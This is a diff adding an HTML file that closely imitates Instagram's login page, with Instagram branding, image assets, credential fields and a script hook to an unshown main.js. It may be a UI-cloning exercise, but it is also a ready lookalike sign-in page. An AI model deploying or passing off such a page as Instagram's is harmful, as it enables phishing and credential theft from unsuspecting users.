@@ -1,0 +1,141 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Instagram • Login</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="/styles.css">
+</head>
+
+<body>
+  <div class="min-h-screen flex flex-col items-center justify-center py-3">
+    <div class="flex flex-col items-center max-w-[350px] w-full gap-2.5">
+      <!-- Auth Card -->
+      <div class="w-full px-10 py-8 border border-[#363636]">
+        <!-- Instagram Logo -->
+        <div class="flex justify-center">
+          <img src="https://www.vectorlogo.zone/logos/instagram/instagram-ar21.svg" alt="Instagram"
+            class="h-auto w-[200px]" />
+        </div>
+
+        <form id="authForm" class="flex flex-col gap-1.5">
+          <input type="text" id="username" placeholder="Phone number, username, or email"
+            class="w-full text-xs rounded px-2 py-2.5 border border-[#363636] bg-[#121212] focus:outline-none"
+            autocomplete="username" />
+          <input type="password" id="password" placeholder="Password"
+            class="w-full text-xs rounded px-2 py-2.5 border-1 border-[#363636]  bg-[#121212] focus:outline-none"
+            autocomplete="current-password" />
+
+          <button type="submit" id="submitButton"
+            class="login-btn mt-2 text-white rounded-lg py-1.5 text-sm font-semibold disabled:cursor-default" disabled>
+            Log in
+          </button>
+
+          <div class="flex items-center my-4">
+            <div class="flex-1 h-px bg-[#363636]"></div>
+            <span class="mx-4 text-sm font-semibold text-[#737373]">OR</span>
+            <div class="flex-1 h-px bg-[#363636]"></div>
+          </div>
+
+          <button type="button"
+            class="flex items-center justify-center gap-2 text-[#0095f6] font-semibold text-sm text-[#0095f6]">
+            <svg xmlns:xlink="http://www.w3.org/1999/xlink" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48"
+              class="w-6 h-6" width="48" height="48">
+              <path fill="#0095F6"
+                d="M24,4C12.954,4,4,12.954,4,24s8.954,20,20,20s20-8.954,20-20S35.046,4,24,4z M30,28h-4v12h-4V28h-4v-4h4v-2 c0-3.308,2.692-6,6-6h4v4h-4c-1.103,0-2,0.897-2,2v2h6V28z">
+              </path>
+            </svg>
+            Log in with Facebook
+          </button>
+
+          <a href="#" id="forgotPassword" class="text-[14px] text-[rgb(224, 241, 255)] text-center mt-3 mt-3 mb-[-10px]">
+            Forgot password?
+          </a>
+        </form>
+      </div>
+
+      <!-- Switch between login/signup -->
+      <div class="w-full border border-[#363636] text-sm py-5 text-center">
+        <p>
+          <span id="switchText">Don't have an account?</span>
+          <button id="switchButton" class="text-[#0095f6] font-semibold ml-1">
+            Sign up
+          </button>
+        </p>
+      </div>
+
+      <!-- Get the app -->
+      <div class="mt-1 text-center">
+        <p class="text-sm">Get the app.</p>
+        <div class="flex gap-2 mt-4">
+          <a href="https://play.google.com/store/apps/details?id=com.instagram.android">
+            <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Get it on Google Play"
+              class="h-10" />
+          </a>
+          <a href="https://apps.microsoft.com/store/detail/instagram/9NBLGGH5L9XT">
+            <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Get it from Microsoft"
+              class="h-10" />
+          </a>
+        </div>
+      </div>
+    </div>
+
+    <!-- Footer -->
+    <div class="mt-20 text-center text-xs text-[rgb(168, 168, 168)]">
+      <div class="flex flex-wrap justify-center gap-x-4 gap-y-3 px-4 mb-4">
+        <a href="https://about.meta.com/">Meta</a>
+        <a href="https://about.instagram.com/">About</a>
+        <a href="https://about.instagram.com/blog/">Blog</a>
+        <a href="https://www.instagram.com/about/jobs/">Jobs</a>
+        <a href="https://help.instagram.com/">Help</a>
+        <a href="https://developers.facebook.com/docs/instagram">API</a>
+        <a href="https://www.instagram.com/legal/privacy/">Privacy</a>
+        <a href="https://www.instagram.com/legal/terms/">Terms</a>
+        <a href="https://www.instagram.com/explore/locations/">Locations</a>
+        <a href="https://www.instagram.com/web/lite/">Instagram Lite</a>
+        <a href="https://www.threads.net/">Threads</a>
+        <a href="https://www.instagram.com/directory/profiles/">Contact Uploading & Non-Users</a>
+        <a href="https://about.meta.com/technologies/meta-verified/">Meta Verified</a>
+      </div>
+      <div class="flex justify-center items-center gap-4">
+        <select class="bg-black text-[rgb(168, 168, 168)] border-none focus:outline-none cursor-pointer">
+          <option value="en">English</option>
+          <option value="en">Español </option>
+          <option value="en">Français </option>
+          <option value="en">Deutsch </option>
+          <option value="en">Italiano </option>
+          <option value="en">Português </option>
+          <option value="en">Русский </option>
+          <option value="en">日本語 </option>
+          <option value="en">한국어 </option>
+          <option value="en">中文 (简体) / 中文 (繁體)</option>
+          <option value="en">العربية </option>
+          <option value="en">עברית </option>
+          <option value="en">हिन्दी </option>
+          <option value="en">Türkçe</option>
+          <option value="en">Bahasa Indonesia</option>
+          <option value="en">Bahasa Melayu</option>
+          <option value="en">ภาษาไทย </option>
+          <option value="en">Tiếng Việt</option>
+          <option value="en">Nederlands </option>
+          <option value="en">Ελληνικά </option>
+          <option value="en">Čeština </option>
+          <option value="en">Dansk </option>
+          <option value="en">Suomi </option>
+          <option value="en">Svenska </option>
+          <option value="en">Norsk </option>
+          <option value="en">Polski </option>
+          <option value="en">Română </option>
+          <option value="en">Filipino </option>
+        </select>
+        <span>© 2024 Instagram from Meta</span>
+      </div>
+    </div>
+  </div>
+
+  <script src="/main.js"></script>
+</body>
+
+</html>
